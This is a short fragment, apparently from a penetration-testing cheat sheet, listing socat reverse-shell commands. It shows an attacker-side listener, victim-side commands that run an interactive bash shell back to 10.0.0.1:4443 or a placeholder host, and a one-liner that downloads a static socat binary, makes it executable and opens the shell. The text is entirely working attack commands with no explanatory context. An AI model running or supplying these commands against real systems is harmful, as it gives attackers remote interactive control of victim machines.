...
```
user@attack$ socat file:`tty`,raw,echo=0 tcp-listen:4443
user@victim$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4443
socat exec:sh,pty,stderr,setsid,sigint,sane tcp-connect:$RHOST:$RPORT
```
```
user@victim$ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4443
```
